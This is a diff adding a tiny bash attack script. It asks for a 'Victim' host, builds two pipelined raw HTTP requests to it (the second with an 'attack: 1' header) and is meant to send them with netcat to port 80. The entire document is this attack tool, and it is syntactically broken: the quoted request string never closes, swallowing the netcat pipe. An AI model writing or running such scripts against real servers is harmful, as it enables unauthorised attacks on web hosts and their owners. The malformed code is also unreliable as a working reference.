@@ -1,0 +1,11 @@
+#!/bin/bash
+echo -ne "[+] Enter Victim: "
+read victim
+
+echo "GET / HTTP/1.1\r\n
+Host: $victim\r\n
+\r\n
+GET / HTTP/1.1\r\n
+Host: $victim\r\n
+attack: 1\r\n
+foo:; | nc $victim 80
